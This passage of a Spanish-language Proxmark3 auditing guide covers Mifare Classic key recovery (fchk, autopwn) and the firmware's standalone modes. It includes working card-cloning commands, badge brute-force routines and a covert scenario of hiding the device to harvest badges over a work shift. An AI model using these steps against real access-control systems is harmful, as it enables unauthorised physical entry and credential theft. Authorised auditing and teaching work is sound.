| `--2k` | Mifare Classic/Plus 2k |
| `--4k` | Mifare Classic 4k / S70 |
| `--emu` | Cargar claves encontradas al emulador |
| `--dump` | Guardar claves encontradas a archivo binario |
| `-f, --file <fn>` | Archivo de diccionario con claves |
| `--mem` | Usar diccionario desde memoria flash (RDV4) |

**Flujo de trabajo optimizado con fchk:**

```bash
# 1. Cargar diccionario a memoria flash (solo una vez, RDV4)
mem load -f mfc_default_keys.dic --mfc

# 2. Verificación rápida desde flash
hf mf fchk --1k --mem --emu --dump

# 3. Si se encontraron claves, dump inmediato
hf mf dump

# 4. Si fchk no encontró todas las claves, usar autopwn
hf mf autopwn
```

**Ejemplo de salida:**

```
[+] found keys:
[+] -----+-----+--------------+---+--------------+----
[+]  Sec | Blk | key A        |res| key B        |res
[+] -----+-----+--------------+---+--------------+----
[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[+]  001 | 007 | A0A1A2A3A4A5 | 1 | B0B1B2B3B4B5 | 1
[+]  002 | 011 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
[=] Dumping keys to binary file hf-mf-<UID>-key.bin
```

#### Automatización Completa con autopwn

El comando `hf mf autopwn` es la **herramienta de automatización integral por excelencia** para auditoría de Mifare Classic. Ejecuta una secuencia inteligente y adaptativa de múltiples técnicas de ataque, optimizando automáticamente el orden según los resultados obtenidos.

**Secuencia de ataques de autopwn:**

1. **Ataque de diccionario** (chk/fchk) → Busca claves por defecto conocidas
2. **Ataque Nested** → Si hay ≥1 clave conocida, deriva las demás
3. **Ataque Hardnested** → Si Nested falla, intenta variante avanzada
4. **Ataque Darkside** → Si nada funciona, explota debilidad PRNG
5. **Ataque StaticNested** → Para tarjetas con random débil
6. **Dump automático** → Genera archivos .bin, .eml, .json

**Sintaxis y parámetros:**

```bash
# Autopwn básico (modo automático completo)
hf mf autopwn

# Autopwn con diccionario personalizado
hf mf autopwn -f mfc_default_keys.dic

# Autopwn para Mifare Classic 4K
hf mf autopwn --4k

# Autopwn con clave conocida como punto de partida
hf mf autopwn -s 0 -a -k FFFFFFFFFFFF

# Modo verbose (mostrar estadísticas)
hf mf autopwn -v

# Modo lento (para tarjetas no estándar)
hf mf autopwn --slow

# Modo legacy (usar chk en lugar de fchk)
hf mf autopwn --legacy

# Guardar con sufijo personalizado
hf mf autopwn -o mycard
```

**Parámetros del comando autopwn:**

| Parámetro | Descripción |
|-----------|-------------|
| `-k, --key <hex>` | Clave conocida de 12 caracteres hex |
| `-s, --sector <dec>` | Número de sector donde usar la clave conocida |
| `-a` | La clave conocida es clave A (por defecto) |
| `-b` | La clave conocida es clave B |
| `-f, --file <fn>` | Archivo de diccionario personalizado |
| `-o <fn>` | Sufijo para archivos de salida (dump y claves) |
| `--slow` | Adquisición lenta (tarjetas no estándar) |
| `--legacy` | Modo legacy (usar `hf mf chk` lento) |
| `-v, --verbose` | Salida verbose con estadísticas |
| `--mini` | Mifare Classic Mini / S20 |
| `--1k` | Mifare Classic 1k / S50 (por defecto) |
| `--2k` | Mifare Classic/Plus 2k |
| `--4k` | Mifare Classic 4k / S70 |

**Flujos de trabajo con autopwn:**

**Escenario 1: Auditoría ciega (sin información previa)**

```bash
# Un solo comando obtiene todo
hf mf autopwn

# Archivos generados:
# - hf-mf-<UID>-key.bin (claves)
# - hf-mf-<UID>-dump.bin (volcado completo)
# - hf-mf-<UID>-dump.eml (formato emulador)
# - hf-mf-<UID>-dump.json (formato estructurado)
```

**Escenario 2: Auditoría con clave conocida**

```bash
# Si conoces una clave del sector 0
hf mf autopwn -s 0 -a -k FFFFFFFFFFFF

# autopwn usará nested/hardnested inmediatamente
# saltando el ataque de diccionario completo
```

**Escenario 3: Tarjetas problemáticas**

```bash
# Algunas tarjetas chinas/clones requieren timing especial
hf mf autopwn --slow

# Si fchk causa problemas, usar modo legacy
hf mf autopwn --legacy --slow
```

**Escenario 4: Organización de múltiples auditorías**

```bash
# Auditar tarjeta de acceso principal
hf mf autopwn -o acceso_principal
# Genera: hf-mf-<UID>-acceso_principal-dump.bin

# Auditar tarjeta de empleado
hf mf autopwn -o empleado_001
# Genera: hf-mf-<UID>-empleado_001-dump.bin
```

**Comparación de velocidad:**

| Método | Tiempo estimado (MFC 1K) | Casos de uso |
|--------|-------------------------|-------------|
| Manual (chk + nested) | 5-10 minutos | Aprendizaje, análisis detallado |
| fchk + dump | 2-3 minutos | Claves conocidas en diccionario |
| autopwn | 1-5 minutos | Auditorías rápidas, producción |
| autopwn --slow | 5-15 minutos | Tarjetas problemáticas |

**Tabla de decisión - ¿Qué comando usar?**

| Situación | Comando recomendado |
|-----------|--------------------|
| Auditoría estándar sin información previa | `hf mf autopwn` |
| Solo verificar si tiene claves por defecto | `hf mf fchk --1k --mem` |
| Tengo una clave, necesito las demás | `hf mf nested -k <clave>` o `autopwn -k <clave>` |
| Tarjeta con PRNG débil | `hf mf darkside` o `autopwn` (lo detecta) |
| Tarjeta no estándar/china | `hf mf autopwn --slow --legacy` |
| Necesito máxima velocidad (RDV4) | `hf mf fchk --mem` + `hf mf nested` |
| Primera vez auditando Mifare | `hf mf autopwn` (más simple) |

**Consejo profesional:**

Para auditorías en campo donde el tiempo es crítico, el flujo óptimo es:

```bash
# 1. Identificación rápida
hf search

# 2. Ataque automatizado
hf mf autopwn

# 3. Análisis de datos (mientras se procesa)
hf mf view -f hf-mf-<UID>-dump.bin

# 4. Clonación inmediata si es necesario
hf mf restore --1k -f hf-mf-<UID>-dump.bin
```

Este flujo te permite ir de "tarjeta desconocida" a "clon funcional" en menos de 5 minutos en la mayoría de casos.

### 5.2. Modo de Operación Autónomo (Standalone)

La capacidad de operar en modo standalone transforma al Proxmark3 de una herramienta de laboratorio, dependiente de un PC, a un dispositivo de campo autónomo. Esta funcionalidad es ideal para escenarios de red teaming, auditorías físicas discretas o evaluaciones de seguridad donde llevar un ordenador portátil no es práctico o no pasa desapercibido.

El firmware RRG/Iceman incluye **múltiples modos standalone** precompilados para diferentes protocolos y escenarios de ataque. Cada modo standalone tiene su propia lógica de operación y secuencia de botones.

#### Activación del Modo Standalone

Para activar cualquier modo standalone:

1. **Mantener presionado el botón** del Proxmark3 durante **2-3 segundos**
2. Observar el patrón de LEDs que indica qué modo standalone está activo
3. Seguir la secuencia de botones específica del modo

**Para salir del modo standalone:**
- **Mantener presionado el botón** durante **≥1 segundo** (HOLD)
- O conectar el Proxmark3 al PC y enviar cualquier comando USB

#### Verificar Modo Standalone Compilado

Antes de usar standalone, verifica qué modo está compilado en tu firmware:

```bash
# Ver información del hardware y firmware
hw status

# Salida incluirá línea similar a:
# Standalone mode.............. LF HID26 Read/Clone/Sim (SamyRun)
```

#### Modos Standalone Disponibles (LF)

**1. LF_SAMYRUN - HID26 Read/Clone/Sim**

El modo clásico de Samy Kamkar para tarjetas HID Prox de 26 bits.

**Funcionalidad:**
- Lee tarjetas HID Prox (formato H10301)
- Simula tarjetas leídas
- Clona a tarjetas T5577 vírgenes
- Almacena hasta 2 tarjetas (A y B)

**Secuencia de operación:**

```
┌─────────────────────────────────────┐
│  ESTADO: Lectura (LED A o B ON)     │
└─────────────────────────────────────┘
         ↓
   HOLD botón 280ms
         ↓
┌─────────────────────────────────────┐
│  Leyendo tarjeta HID...             │
│  LED seleccionado (A o B) encendido │
└─────────────────────────────────────┘
         ↓
┌─────────────────────────────────────┐
│  ESTADO: Simulación (LED C ON)      │
└─────────────────────────────────────┘
         ↓
   HOLD botón
         ↓
┌─────────────────────────────────────┐
│  Simulando tarjeta almacenada       │
│  LEDs: A/B + C encendidos           │
└─────────────────────────────────────┘
         ↓
   HOLD botón
         ↓
┌─────────────────────────────────────┐
│  ESTADO: Clonación (LED D ON)       │
└─────────────────────────────────────┘
         ↓
   Colocar T5577 virgen
         ↓
┌─────────────────────────────────────┐
│  Clonando a T5577...                │
│  LEDs: A/B + D encendidos           │
└─────────────────────────────────────┘
```

**LEDs:**
- LED A: Operando en banco/slot A
- LED B: Operando en banco/slot B  
- LED C: Modo simulación activo
- LED D: Modo clonación activo

**2. LF_EM4100RSWB - EM410x Read/Sim/Write/Brute**

Modo avanzado para tarjetas EM410x con capacidad de bruteforce.

**Funcionalidad:**
- Lee llaveros EM410x
- Simula EM410x
- Clona a T5577
- **Bruteforce**: Incrementa/decrementa ID automáticamente
- Almacena hasta 4 slots

**Modos de operación:**

| Modo | Pulsación | Descripción |
|------|-----------|-------------|
| READ | Click corto → modo READ | Lee EM410x y guarda en slot actual |
| SIM | Auto después de READ | Simula EM410x del slot actual |
| WRITE | Click corto → modo WRITE | Clona a T5577 virgen |
| BRUTE | Click corto → modo BRUTE | Incrementa ID y simula continuamente |

**HOLD largo**: Cambia de slot (1→2→3→4→1)

**Ejemplo de uso - Bruteforce de control de acceso:**

```
1. HOLD 2 seg → Entrar a standalone
2. LED indica slot 1
3. Click corto repetidas veces → Llegar a modo BRUTE
4. Proxmark3 empezará a simular IDs incrementales
5. Presentar al lector objetivo
6. Cuando el lector abra, CLICK para guardar ID que funcionó
```

**3. LF_HIDBRUTE - HID Corporate 1000 Bruteforce**

Modo especializado para bruteforce de tarjetas HID Corporate 1000 (35 bits).

**Funcionalidad:**
- Lee tarjeta HID original
- Calcula checksums correctos (paridad)
- Incrementa/decrementa Card Number
- Mantiene Facility Code constante
- Clona a T5577

**Secuencia:**

```
HOLD → Leer tarjeta HID original
HOLD de nuevo → Iniciar bruteforce
  - Decrementa Card Number desde el leído
  - Simula cada Card Number durante ~20 segundos
  - Mantiene Facility Code original
CLICK durante bruteforce → Detener
HOLD durante lectura → Clonar a T5577
```

**Ejemplo práctico:**

```
Tarjeta leída: FC=101, CN=1337
Bruteforce probará:
  FC=101, CN=1336
  FC=101, CN=1335
  FC=101, CN=1334
  ...
  FC=101, CN=0
```

#### Modos Standalone Disponibles (HF)

**4. HF_YOUNG - Mifare Classic Read/Sim**

Modo para capturar y simular tarjetas Mifare Classic.

**Funcionalidad:**
- Lee UIDs de Mifare Classic
- Almacena hasta 4 UIDs
- Simula UIDs almacenados

**Secuencia:**

```
Estado RECORD:
  - LED del slot seleccionado encendido + LED D
  - Acercar tarjeta Mifare → Captura UID
  - LEDs parpadean al capturar
  - Auto-cambia a estado EMULATE

Estado EMULATE:
  - LED del slot seleccionado encendido + LED B
  - Proxmark3 simula UID almacenado
  - CLICK → Cambiar de slot
  - HOLD 1 seg → Volver a RECORD
```

**5. HF_ICECLASS - iClass Dump/Sim/Attack**

Modo avanzado para tarjetas HID iClass.

**Funcionalidad:**
- Ataque LOCLASS (recuperación de claves)
- Dump completo de tarjetas iClass
- Simulación desde dumps
- Guardado en flash (RDV4)

**Modos:**

| Pulsaciones | Modo | Descripción |
|-------------|------|-------------|
| 1 click | SIM | Simular iClass desde dump en flash |
| 2 clicks | ATTACK | Ataque LOCLASS para recuperar claves |
| 3 clicks | READER | Leer y dumpear tarjeta iClass |
| HOLD | EXIT | Salir de standalone |

**6. HF_MATTYRUN - Mifare Classic Autopwn Standalone**

Modo autónomo que ejecuta autopwn sin PC.

**Funcionalidad:**
- Detecta tarjeta Mifare Classic
- Ejecuta autopwn (diccionario + nested)
- Carga dump en emulador
- Simula tarjeta automáticamente

**Operación:**

```
HOLD 2 seg → Entrar a standalone
  ↓
Acercar tarjeta Mifare
  ↓
LED C + D ON → Atacando...
  ↓
LED A + B + C ON → Cargando dump al emulador...
  ↓
Todos LEDs OFF → Simulación activa
  ↓
Presentar Proxmark3 al lector objetivo
  ↓
CLICK corto → Volver a detección
HOLD 1 seg → Salir
```

#### Modos Standalone de Recopilación de Datos

**7. LF_ICEHID - HID/EM/AWID Collector**

Recopila credenciales LF y las guarda en flash (RDV4).

**Funcionalidad:**
- Escaneo continuo de tarjetas HID, EM410x, AWID
- Almacena todas las credenciales únicas en archivo de log
- Perfecto para auditorías de largo plazo

**Operación:**

```
HOLD 2 seg → Iniciar recopilación
LED A ON → Escaneando...
LED B parpadea → Credencial detectada y guardada
LED C parpadea → Escribiendo a flash

HOLD 280ms → Detener y salir

Para recuperar datos:
Conectar a PC:
pm3 --> mem spiffs dump -s lf_hidcollect.log -d lf_hidcollect.log
```

**8. HF_14ASNIFF - ISO14443A Traffic Logger**

Captura tráfico entre lector y tarjeta ISO14443A.

**Funcionalidad:**
- Sniffing pasivo de comunicaciones HF
- Captura autenticaciones, comandos, datos
- Guarda trace a flash (RDV4)

**Operación:**

```
HOLD 2 seg → Iniciar sniffing
LED A ON → Sniffing activo
LED B/C parpadean → Tráfico detectado

CLICK corto → Detener sniffing
LED D ON → Guardando trace a flash

Recuperar datos:
pm3 --> mem spiffs dump -s hf_14asniff.trace -d hf_14asniff.trace
pm3 --> trace load -f hf_14asniff.trace
pm3 --> trace list -t mf
```

#### Compilar Modos Standalone Personalizados

Para cambiar el modo standalone compilado:

```bash
# 1. Editar archivo de configuración
cd ~/proxmark3
nano Makefile.platform

# 2. Encontrar línea STANDALONE
# Cambiar a modo deseado:
STANDALONE=LF_SAMYRUN        # Para HID26
# o
STANDALONE=LF_HIDBRUTE       # Para bruteforce HID
# o  
STANDALONE=HF_YOUNG          # Para Mifare UID
# o
STANDALONE=HF_MATTYRUN       # Para Mifare autopwn

# 3. Recompilar firmware
make clean && make -j

# 4. Flashear
pm3-flash-all

# 5. Verificar
hw status
```

**Modos standalone disponibles:**

| Nombre | Protocolo | Funcionalidad principal |
|--------|-----------|------------------------|
| LF_SAMYRUN | HID Prox | Read/Clone/Sim HID26 |
| LF_EM4100RSWB | EM410x | Read/Sim/Write/Bruteforce |
| LF_EM4100RWC | EM410x | Read/Write/Clone simple |
| LF_HIDBRUTE | HID | Corporate 1000 bruteforce |
| LF_PROXBRUTE | HID | ProxII bruteforce |
| LF_ICEHID | Multi-LF | Recopilador HID/EM/AWID |
| HF_YOUNG | Mifare | UID Read/Sim |
| HF_MATTYRUN | Mifare | Autopwn standalone |
| HF_ICECLASS | iClass | Dump/Sim/Attack |
| HF_14ASNIFF | ISO14443A | Traffic sniffer |
| HF_AVEFUL | Ultralight | MFU Read/Sim |
| HF_CRAFTBYTE | ISO14443A | UID scanner/emulator |

#### Casos de Uso Prácticos de Standalone

**Escenario 1: Auditoría de parking corporativo**

```
Objetivo: Clonar llavero de acceso vehicular

Modo: LF_SAMYRUN

1. HOLD 2 seg → Activar standalone
2. Pedir prestado llavero a empleado
3. HOLD 280ms → Iniciar lectura (LED A ON)
4. Acercar llavero → Captura automática
5. HOLD → Cambiar a modo SIM (LED C ON)
6. Probar en barrera → Confirmar funciona
7. HOLD → Cambiar a CLONE (LED D ON)
8. Colocar T5577 virgen → Clonación automática
9. Devolver llavero original
10. Usar clon en evaluación posterior
```

**Escenario 2: Bruteforce de badge de empleado**

```
Objetivo: Encontrar badges válidos variando Card Number

Modo: LF_HIDBRUTE

1. Obtener badge de empleado conocido (prestado)
2. HOLD 2 seg → Standalone
3. HOLD 280ms → Leer badge (FC=100, CN=5000)
4. Devolver badge original
5. HOLD de nuevo → Iniciar bruteforce
6. Proxmark3 prueba: 4999, 4998, 4997...
7. Presentar a lector durante bruteforce
8. Cuando lector abra, CLICK para detener
9. Ese Card Number es válido
```

**Escenario 3: Recopilación masiva de credenciales**

```
Objetivo: Capturar todas las tarjetas usadas en un lector

Modo: LF_ICEHID

1. Esconder Proxmark3 cerca del lector (con batería)
2. HOLD 2 seg → Iniciar recopilación
3. Dejar operando 8 horas (turno laboral)
4. Recuperar dispositivo
5. Conectar a PC
6. mem spiffs dump -s lf_hidcollect.log -d badges.txt
7. Analizar badges capturados
```

**Ventajas del Modo Standalone:**

- **Sigilo**: Sin necesidad de laptop visible
- **Movilidad**: Solo necesitas el Proxmark3 y batería
- **Velocidad**: Operaciones inmediatas sin bootear PC
- **Autonomía**: Funciona con batería durante horas (RDV4)
- **Simplicidad**: Sin cables, sin comandos, solo botones

**Limitaciones:**

- Solo un modo standalone activo (requiere recompilación para cambiar)
- Sin feedback visual detallado (solo LEDs)
- Capacidad de almacenamiento limitada (2-4 slots típicamente)
- No permite análisis en tiempo real de datos
- Bruteforce puede ser lento sin feedback de éxito del lector

---

## Conclusión

Esta guía proporciona una base técnica sólida para realizar auditorías de seguridad de tarjetas RFID/NFC utilizando el Proxmark3. Desde la configuración inicial del firmware hasta la clonación y manipulación de tarjetas, cada fase del proceso ha sido diseñada para seguir una metodología profesional y sistemática.

Es fundamental recordar que estas técnicas deben utilizarse exclusivamente en contextos legales y éticos, como auditorías de seguridad autorizadas o investigaciones académicas. El conocimiento de estas vulnerabilidades es esencial para mejorar la seguridad de los sistemas de control de acceso y proteger infraestructuras críticas.
